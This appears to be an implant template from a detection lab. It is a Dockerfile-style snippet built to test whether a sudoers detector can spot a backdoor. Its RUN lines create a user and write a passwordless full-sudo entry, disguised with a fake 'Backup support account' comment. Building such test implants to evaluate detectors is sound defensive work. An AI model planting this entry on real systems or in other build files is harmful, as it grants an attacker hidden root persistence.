# Implant template: sudoers-nopass-attacker (L1, armed)
#
# Backdoor sudoers entry: a fresh user with NOPASSWD: ALL.
# In linpersist v0.1.0 this fires sudoers_nopasswd + sudoers_all_commands
# -- IDENTICAL signals to legitimate CI/ops sudoers entries.
#
# The lab's purpose with THIS implant is to measure whether Q7 can
# distinguish it from the legit gitlab-runner/jenkins entries.
# Spoiler: it cannot in v0.1.0.
#
# Variables: ${attacker_user}, ${sudoers_file}

# Create the backdoor user (no shell access needed for sudo to work,
# but a real attacker would set /bin/bash).
RUN useradd --create-home --shell /bin/bash ${attacker_user} 2>/dev/null || true

# Drop the sudoers entry in /etc/sudoers.d/.
RUN mkdir -p $$(dirname ${sudoers_file}) && \
    printf '%s\n' \
        '# Backup support account (generated by deploy-tools)' \
        '${attacker_user} ALL=(ALL) NOPASSWD: ALL' \
        > ${sudoers_file} && \
    chown root:root ${sudoers_file} && \
    chmod 0440 ${sudoers_file}
